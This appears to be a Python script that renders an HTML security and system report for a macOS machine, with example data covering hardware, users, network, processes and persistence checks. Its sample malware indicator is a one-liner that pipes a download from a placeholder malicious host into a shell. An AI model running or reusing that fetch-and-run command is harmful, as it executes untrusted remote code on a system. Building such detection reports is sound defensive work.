import datetime

def generate_html_report(report_data, output_path="trex_report.html"):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>T-Rex System Report</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            margin: 20px;
            background: #f4f4f4;
        }}
        h1, h2 {{
            color: #333;
        }}
        .section {{
            background: #fff;
            padding: 20px;
            margin-bottom: 20px;
            border-left: 5px solid #007BFF;
        }}
        .error {{
            color: #b30000;
            font-weight: bold;
        }}
        .malware {{
            color: red;
            background-color: #ffe6e6;
            padding: 5px;
            border-radius: 5px;
            font-family: monospace;
        }}
        pre {{
            background: #eee;
            padding: 10px;
            overflow-x: auto;
            border-radius: 4px;
        }}
    </style>
</head>
<body>

<h1>T-Rex System Report</h1>
<p>System: <strong>{report_data['system_name']}</strong> &nbsp;&nbsp; | &nbsp;&nbsp; Generated: {now}</p>
"""

    for section in report_data['sections']:
        html += f"""
<div class="section">
    <h2>{section['title']}</h2>
    <pre>{section['content']}</pre>
</div>
"""

    if report_data.get("malware_indicators"):
        html += """
<div class="section">
    <h2>⚠️ Malware Indicators</h2>
"""
        for indicator in report_data['malware_indicators']:
            html += f"""    <pre class="malware">{indicator}</pre>\n"""
        html += "</div>"

    if report_data.get("errors"):
        html += """
<div class="section">
    <h2>Report Generation Errors</h2>
    <ul>
"""
        for err in report_data["errors"]:
            html += f"""        <li class="error">{err}</li>\n"""
        html += "    </ul>\n</div>"

    html += "</body>\n</html>"

    with open(output_path, "w") as f:
        f.write(html)
    print(f"✅ HTML report generated: {output_path}")

# === EXAMPLE USAGE ===
if __name__ == "__main__":
    # Replace these with actual parsed results from your script
    report_data = {
        "system_name": "s-it-wfh-s-spencer-imac2017",
        "sections": [
            {
                "title": "System & Hardware Report",
                "content": """system_profiler SPSoftwareDataType
system_profiler SPHardwareDataType
sysctl -n hw.memsize
vm_stat
sysctl vm.swapusage
diskutil list -plist
❌ Unexpected error parsing diskutil list: unexpected key at line 51"""
            },
            {
                "title": "User & Security Report",
                "content": "dscl . -list /Users\nls /Users"
            },
            {
                "title": "Network Connectivity Report",
                "content": "sudo netstat -an\nifconfig\nscutil --dns"
            },
            {
                "title": "Processes & Software Report",
                "content": "ps aux\n/Applications/\n~/Applications/"
            },
            {
                "title": "Scheduled Tasks & Persistence",
                "content": """LaunchDaemons: ❌ Permission denied
LaunchAgents: ❌ Permission denied
cron jobs: None found
/etc/cron.*: Not found"""
            }
        ],
        "malware_indicators": [
            "/usr/bin/python3 -c \"import os; os.system('curl http://malicious.com/payload.sh | sh')\""
        ],
        "errors": [
            "generate_report_html() got multiple values for argument 'browser_preference'",
            "Could not list some LaunchDaemons or LaunchAgents due to permission issues"
        ]
    }

    generate_html_report(report_data)
